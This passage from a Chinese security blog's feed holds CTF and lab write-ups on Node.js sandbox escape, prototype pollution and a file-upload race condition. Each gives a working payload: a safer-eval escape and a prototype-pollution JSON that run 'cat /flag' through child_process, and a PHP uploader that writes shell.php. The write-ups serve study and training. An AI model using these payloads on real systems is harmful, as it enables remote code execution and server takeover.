class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> saferEval = <span class="built_in">require</span>(<span class="string">&#x27;safer-eval&#x27;</span>); <span class="comment">// 2019.7/WORKER1 找到一个很棒的库</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = express();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.use(bodyParser.urlencoded(&#123; <span class="attr">extended</span>: <span class="literal">false</span> &#125;));</span><br><span class="line">app.use(bodyParser.json());</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2020.1/WORKER2 老板说为了后期方便优化</span></span><br><span class="line">app.use(<span class="function">(<span class="params">req, res, next</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (req.path === <span class="string">&#x27;/eval&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> delay = <span class="number">60</span> * <span class="number">1000</span>;</span><br><span class="line">    <span class="built_in">console</span>.log(delay);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">Number</span>.isInteger(<span class="built_in">parseInt</span>(req.query.delay))) &#123;</span><br><span class="line">      delay = <span class="built_in">Math</span>.max(delay, <span class="built_in">parseInt</span>(req.query.delay));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">const</span> t = <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> next(), delay);</span><br><span class="line">    <span class="comment">// 2020.1/WORKER3 老板说让我优化一下速度，我就直接这样写了，其他人写了啥关我p事</span></span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="built_in">clearTimeout</span>(t);</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="string">&#x27;timeout&#x27;</span>);</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        res.send(<span class="string">&#x27;Timeout!&#x27;</span>);</span><br><span class="line">      &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;, <span class="number">1000</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    next();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.post(<span class="string">&#x27;/eval&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> response = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">  <span class="keyword">if</span> (req.body.e) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      response = saferEval(req.body.e);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">      response = <span class="string">&#x27;Wrong Wrong Wrong!!!!&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  res.send(<span class="built_in">String</span>(response));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2019.10/WORKER1 老板娘说她要看到我们的源代码，用行数计算KPI</span></span><br><span class="line">app.get(<span class="string">&#x27;/source&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  res.set(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;text/javascript;charset=utf-8&#x27;</span>);</span><br><span class="line">  res.send(fs.readFileSync(<span class="string">&#x27;./index.js&#x27;</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2019.12/WORKER3 为了方便我自己查看版本，加上这个接口</span></span><br><span class="line">app.get(<span class="string">&#x27;/version&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  res.set(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;text/json;charset=utf-8&#x27;</span>);</span><br><span class="line">  res.send(fs.readFileSync(<span class="string">&#x27;./package.json&#x27;</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">&#x27;/&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  res.set(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;text/html;charset=utf-8&#x27;</span>);</span><br><span class="line">  res.send(fs.readFileSync(<span class="string">&#x27;./index.html&#x27;</span>))</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.listen(<span class="number">80</span>, <span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;Start listening&#x27;</span>)</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>当尝试访问<code>/eval</code>路由时，题目定义一个默认值为60000的delay，同时用户也会get传递一个delay，二者之间会选出较大的一个作为setTimeout函数的延时长度，接下来题目又规定延时不能超过1000ms，否则就不能访问<code>/eval</code>路由执行沙盒逃逸</p><p>这里用到setTimeout的整数溢出漏洞，当delay大于2147483647或小于1时，delay会因为溢出而被设置为1，这样延时就只有1ms了</p><p>然后只要把safer-eval的payload传过去就能得到flag</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> process = clearImmediate.constructor(<span class="string">&quot;return process;&quot;</span>)();</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> process.mainModule.require(<span class="string">&quot;child_process&quot;</span>).execSync(<span class="string">&quot;cat /flag&quot;</span>).toString()&#125;)()</span><br></pre></td></tr></table></figure><p><img src="/2022/03/15/NodeJS%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8/image-20220320182754770.png" alt="image-20220320182754770"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;vm模块&quot;&gt;&lt;a href=&quot;#vm模块&quot; class=&quot;headerlink&quot; title=&quot;vm模块&quot;&gt;&lt;/a&gt;vm模块&lt;/h1&gt;&lt;p&gt;node.js 里提供了 vm 模块，相当于一个虚拟机，可以让你在执行代码时候隔离当前的执行环境，避免被恶意代码攻击。&lt;co</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>JavaScript原型链污染</title>
    <link href="https://wuyusanhua2021.github.io/2022/03/02/node-js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"/>
    <id>https://wuyusanhua2021.github.io/2022/03/02/node-js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</id>
    <published>2022-03-02T10:10:51.000Z</published>
    <updated>2022-03-03T04:41:12.197Z</updated>
    
    <content type="html"><![CDATA[<h1 id="继承与原型链"><a href="#继承与原型链" class="headerlink" title="继承与原型链"></a>继承与原型链</h1><p>JavaScript语言是动态的，本身不提供class的实现，当谈到继承时，JavaScript 只有一种结构：对象。每个实例对象（object）都有一个私有属性（称之为 <strong>proto</strong> ）指向它的构造函数的原型对象（<strong>prototype</strong>）。该原型对象也有一个自己的原型对象（__proto__），层层向上直到一个对象的原型对象为 <code>null</code>。根据定义，<code>null</code> 没有原型，并作为这个<strong>原型链</strong>中的最后一个环节。</p><p>关于<code>prototype</code>，<code>__proto__</code>，<code>constructor</code>的关系这里有一篇blog做了详细讲解：<a href="https://alexzhong22c.github.io/2017/08/08/js-proto/">理解prototype、__proto__和constructor等关系    </a></p><p>当试图访问一个JavaScript对象的属性时，它不仅仅在该对象上搜寻，还会搜寻该对象的原型，以及该对象的原型的原型，依次层层向上搜索，直到找到一个名字匹配的属性或到达原型链的末尾。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> f = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;  <span class="comment">//f.prototype直接继承了Object.prototype</span></span><br><span class="line">    <span class="built_in">this</span>.a = <span class="number">1</span>;      <span class="comment">//数组继承了Array.prototype,函数继承了Function.prototype</span></span><br><span class="line">    <span class="built_in">this</span>.b = <span class="number">2</span>;      <span class="comment">//同时Array,Function又继承了Object.prototype</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> o = <span class="keyword">new</span> f();  <span class="comment">//o继承了f</span></span><br><span class="line"></span><br><span class="line">f.prototype.b = <span class="number">3</span>;  <span class="comment">//可以通过Objectname.prototype.name=value</span></span><br><span class="line">f.prototype.c = <span class="number">4</span>;  <span class="comment">//的方式修改原型链,添加属性或方法</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(o.a); <span class="comment">// 输出1</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(o.b); <span class="comment">// 输出2</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(o.c); <span class="comment">// 输出4</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(o.d); <span class="comment">// 输出null</span></span><br></pre></td></tr></table></figure><p>上例的原型链为:<code>o -&gt; f.prototype -&gt; Object.prototype -&gt; null</code></p><p>下面两幅图也可以形象地展示原型链：</p><p><img src="/2022/03/02/node-js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/20220302blog1.png"></p><p><img src="/2022/03/02/node-js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/t011cffd77e8d3ec6c6.png"></p><h1 id="原型链污染原理"><a href="#原型链污染原理" class="headerlink" title="原型链污染原理"></a>原型链污染原理</h1><p>当我们可以修改某个构造函数其中的属性值时，其他用该函数生成的对象也会具备这个属性值，也就是说所有继承了被污染原型的对象都会受到影响</p><p>发生原型链污染的必要条件就是需要一个可控的对象键值，对于语句<code>object[a][b] = value</code>，如果可以控制a、b、value的值，将a设置为<code>__proto__</code>，我们就可以给object对象的原型设置一个b属性，值为value，这样所有继承object的对象都具有属性b，值为value</p><p>原型链污染的发生主要有两种场景：<strong>不安全的对象递归合并</strong>和<strong>按路径定义属性</strong></p><h2 id="不安全的对象递归合并"><a href="#不安全的对象递归合并" class="headerlink" title="不安全的对象递归合并"></a>不安全的对象递归合并</h2><p>关键点在于<strong>递归</strong>，若通过非递归的方式浅拷贝实现merge，则原型链不会被污染，例如Object.assign函数，虽然对于简单的属性值得到的是深拷贝，但是对对象或其他引用类型，则是浅拷贝，因此不会造成污染</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">merge</span>(<span class="params">target, source</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> source) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> source &amp;&amp; key <span class="keyword">in</span> target) &#123;</span><br><span class="line">            merge(target[key], source[key])</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            target[key] = source[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// object1继承了Object.prototype</span></span><br><span class="line"><span class="keyword">let</span> object1 = &#123;&#125;</span><br><span class="line"><span class="comment">//在作为JSON进行解析时,__proto__才被看作是键名</span></span><br><span class="line"><span class="keyword">let</span> object2 = <span class="built_in">JSON</span>.parse(<span class="string">&#x27;&#123;&quot;a&quot;: 1, &quot;__proto__&quot;: &#123;&quot;b&quot;: 2&#125;&#125;&#x27;</span>)</span><br><span class="line"><span class="comment">//对object1,object2进行深拷贝</span></span><br><span class="line">merge(object1, object2)</span><br><span class="line"><span class="built_in">console</span>.log(object1.a, object1.b)</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> object3 = &#123;&#125;</span><br><span class="line"><span class="built_in">console</span>.log(object3.b)</span><br></pre></td></tr></table></figure><p>分析上面代码的具体流程：</p><p>object2被深拷贝到object1中，首先是<code>object1[a]=object2[a]=1</code>，</p><p>然后在对键名<code>__proto__</code>拷贝时有，<code>object1.__proto__.b=object2.__proto__.b=2</code></p><p>也就有<code>Object.prototype.b=object1.__proto__.b=2</code></p><p>因此输出的object3.b值为3</p><p>这一类漏洞的触发点通常为<code>merge(),clone()</code>等函数</p><h2 id="按路径定义属性"><a href="#按路径定义属性" class="headerlink" title="按路径定义属性"></a>按路径定义属性</h2><p>有些JavaScript库的函数支持根据指定的路径修改或定义对象的属性值。通常这些函数类似以下的形式：<code>theFunction(object,  path,  value)</code>，将对象object的指定路径path上的属性值修改为value。如果攻击者可以控制路径path的值，那么将路径设置为<code>proto.theValue</code>，运行theFunction函数之后就有可能将theValue属性注入到object的原型中</p><h1 id="例题-Ez-express"><a href="#例题-Ez-express" class="headerlink" title="例题:Ez_express"></a>例题:Ez_express</h1><p><code>www.zip</code>得源码，审计</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.Router();</span><br><span class="line"><span class="keyword">const</span> isObject = <span class="function"><span class="params">obj</span> =&gt;</span> obj &amp;&amp; obj.constructor &amp;&amp; obj.constructor === <span class="built_in">Object</span>;</span><br><span class="line"><span class="keyword">const</span> merge = <span class="function">(<span class="params">a, b</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> attr <span class="keyword">in</span> b) &#123;</span><br><span class="line">    <span class="keyword">if</span> (isObject(a[attr]) &amp;&amp; isObject(b[attr])) &#123;</span><br><span class="line">      merge(a[attr], b[attr]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      a[attr] = b[attr];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> a</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> clone = <span class="function">(<span class="params">a</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> merge(&#123;&#125;, a);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safeKeyword</span>(<span class="params">keyword</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(keyword.match(<span class="regexp">/(admin)/i</span>s)) &#123;</span><br><span class="line">      <span class="keyword">return</span> keyword</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">undefined</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">router.get(<span class="string">&#x27;/&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(!req.session.user)&#123;</span><br><span class="line">    res.redirect(<span class="string">&#x27;/login&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  res.outputFunctionName=<span class="literal">undefined</span>;</span><br><span class="line">  res.render(<span class="string">&#x27;index&#x27;</span>,data=&#123;<span class="string">&#x27;user&#x27;</span>:req.session.user.user&#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">router.get(<span class="string">&#x27;/login&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  res.render(<span class="string">&#x27;login&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">router.post(<span class="string">&#x27;/login&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(req.body.Submit==<span class="string">&quot;register&quot;</span>)&#123;</span><br><span class="line">   <span class="keyword">if</span>(safeKeyword(req.body.userid))&#123;</span><br><span class="line">    res.end(<span class="string">&quot;&lt;script&gt;alert(&#x27;forbid word&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>) </span><br><span class="line">   &#125;</span><br><span class="line">    req.session.user=&#123;</span><br><span class="line">      <span class="string">&#x27;user&#x27;</span>:req.body.userid.toUpperCase(),</span><br><span class="line">      <span class="string">&#x27;passwd&#x27;</span>: req.body.pwd,</span><br><span class="line">      <span class="string">&#x27;isLogin&#x27;</span>:<span class="literal">false</span></span><br><span class="line">    &#125;</span><br><span class="line">    res.redirect(<span class="string">&#x27;/&#x27;</span>); </span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span>(req.body.Submit==<span class="string">&quot;login&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!req.session.user)&#123;res.end(<span class="string">&quot;&lt;script&gt;alert(&#x27;register first&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>)&#125;</span><br><span class="line">    <span class="keyword">if</span>(req.session.user.user==req.body.userid&amp;&amp;req.body.pwd==req.session.user.passwd)&#123;</span><br><span class="line">      req.session.user.isLogin=<span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">      res.end(<span class="string">&quot;&lt;script&gt;alert(&#x27;error passwd&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">  &#125;</span><br><span class="line">  res.redirect(<span class="string">&#x27;/&#x27;</span>); ;</span><br><span class="line">&#125;);</span><br><span class="line">router.post(<span class="string">&#x27;/action&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(req.session.user.user!=<span class="string">&quot;ADMIN&quot;</span>)&#123;res.end(<span class="string">&quot;&lt;script&gt;alert(&#x27;ADMIN is asked&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>)&#125; </span><br><span class="line">  req.session.user.data = clone(req.body);</span><br><span class="line">  res.end(<span class="string">&quot;&lt;script&gt;alert(&#x27;success&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>);  </span><br><span class="line">&#125;);</span><br><span class="line">router.get(<span class="string">&#x27;/info&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  res.render(<span class="string">&#x27;index&#x27;</span>,data=&#123;<span class="string">&#x27;user&#x27;</span>:res.outputFunctionName&#125;);</span><br><span class="line">&#125;)</span><br><span class="line"><span class="built_in">module</span>.exports = router;</span><br></pre></td></tr></table></figure><p>要求以admin账户登录，admin被正则过滤，可以用特殊字符绕过toUpperCase()函数，注册<code>admın</code>用户，登录后提示<code>flag in /flag</code></p><p><code>/action</code>路由下会调用<code>clone()</code>函数，此处为原型链污染触发点，用户提交的信息被clone到了user.data</p><p><code>/info</code>路由下会渲染输出<code>res.outputFunctionName</code>，因此我们可以将outputFunctionName污染，来输出flag</p><p>payload:</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;lua&quot;</span>:<span class="string">&quot;a&quot;</span>,<span class="attr">&quot;__proto__&quot;</span>:&#123;<span class="attr">&quot;outputFunctionName&quot;</span>:<span class="string">&quot;a=1;return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;cat /flag&#x27;)//&quot;</span>&#125;,<span class="attr">&quot;Submit&quot;</span>:<span class="string">&quot;&quot;</span>&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;继承与原型链&quot;&gt;&lt;a href=&quot;#继承与原型链&quot; class=&quot;headerlink&quot; title=&quot;继承与原型链&quot;&gt;&lt;/a&gt;继承与原型链&lt;/h1&gt;&lt;p&gt;JavaScript语言是动态的，本身不提供class的实现，当谈到继承时，JavaScript 只有一种结</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>条件竞争学习</title>
    <link href="https://wuyusanhua2021.github.io/2022/02/17/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E5%AD%A6%E4%B9%A0/"/>
    <id>https://wuyusanhua2021.github.io/2022/02/17/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E5%AD%A6%E4%B9%A0/</id>
    <published>2022-02-17T04:27:34.000Z</published>
    <updated>2022-02-18T06:03:11.693Z</updated>
    
    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>条件竞争是指一个系统的运行结果依赖于不受控制的事件的先后顺序。当这些不受控制的事件并没有按照开发者想要的方式运行时，就可能会出现<code>bug</code>。尤其在当前我们的系统中大量对资源进行共享，如果处理不当的话，就会产生条件竞争漏洞。说的通俗一点，条件竞争涉及到的就是操作系统中所提到的进程或者线程同步的问题，当一个程序的运行的结果依赖于线程的顺序，处理不当就会发生条件竞争。</p><h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><h2 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h2><p>进程是为了更好的利用CPU的资源；进程是系统进行资源分配和调度的一个独立单位；每个进程都有自己的独立内存空间，不同进程通过进程间通信来通信；由于进程比较重要，占据独立的内存，所以上下文进程间的切换开销（栈、寄存器、虚拟内存、文件句柄等）比较大，但相对比较稳定安 全。</p><h2 id="线程"><a href="#线程" class="headerlink" title="线程"></a>线程</h2><p>线程的是为了降低上下文切换的消耗，提高系统的并发性，并突破一个进程只能干一样事的缺陷，使到进程内并发成为可能。 线程是进程的一个实体,是CPU调度和分派的基本单位,它是比进程更小的能独立运行的基本单位。线程自己基本上不拥有系统资源,只拥有一点在运行中必不可少的资源(如程序计数器,一组寄 存器和栈),但是它可与同属一个进程的其他的线程共享进程所拥有的全部资源。 线程间通信主要通过共享内存，上下文切换很快，资源开销较少，但相比进程不够稳定容易 丢失数据。</p><h2 id="Session"><a href="#Session" class="headerlink" title="Session"></a>Session</h2><p>PHP session 变量用于存储关于用户会话（session）的信息，或者更改用户会话（session）的设置。Session 变量存储单一用户的信息，并且对于应用程序中的所有页面都是可用的。</p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>举一个经典的银行取款的例子，假设有一个用户余额为x元，向服务器发送了n个取款m元的请求(m * n &gt; x)，服务器的处理逻辑是先判断用户余额是否满足请求来创建订单，然后修改用户余额，那么在多线程请求的情况下，总是会有可能出现某一次在修改余额之前，就有另一个线程的请求访问服务器来进行余额判定，这样在余额接近0时，就可能会产生多余的非法订单，使得最终提取的金额大于x</p><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><p>以<code>upload-labs-master/Pass18</code>为例，查看源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    <span class="variable">$file_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_ext</span> = substr(<span class="variable">$file_name</span>,strrpos(<span class="variable">$file_name</span>,<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="variable">$upload_file</span> = <span class="variable">$UPLOAD_ADDR</span> . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$file_name</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$upload_file</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(in_array(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;</span><br><span class="line">             <span class="variable">$img_path</span> = <span class="variable">$UPLOAD_ADDR</span> . <span class="string">&#x27;/&#x27;</span>. rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line">             rename(<span class="variable">$upload_file</span>, <span class="variable">$img_path</span>);</span><br><span class="line">             <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;</span><br><span class="line">            unlink(<span class="variable">$upload_file</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&#x27;上传失败！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>处理逻辑为：先把上传文件储存下来，再判断文件是否为<code>jpg | png | gif</code>类型，是则修改文件名保存，否则unlink删除</p><p>那么在储存文件后，判断文件类型之前，攻击者是可以访问文件的，若上传的文件内容为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">fputs(fopen(<span class="string">&#x27;shell.php&#x27;</span>, <span class="string">&#x27;w&#x27;</span>), <span class="string">&#x27;&lt;?php phpinfo()?&gt;&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>此时使用burp的intruder模块上传该文件，并不停访问它，那么总有一次在判断文件类型之前就能访问到该文件，并且按照文件内容生成shell.php</p><p><img src="/2022/02/17/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E5%AD%A6%E4%B9%A0/image-20220218135116582.png" alt="image-20220218135116582"></p>]]></content>
    
    
      
      
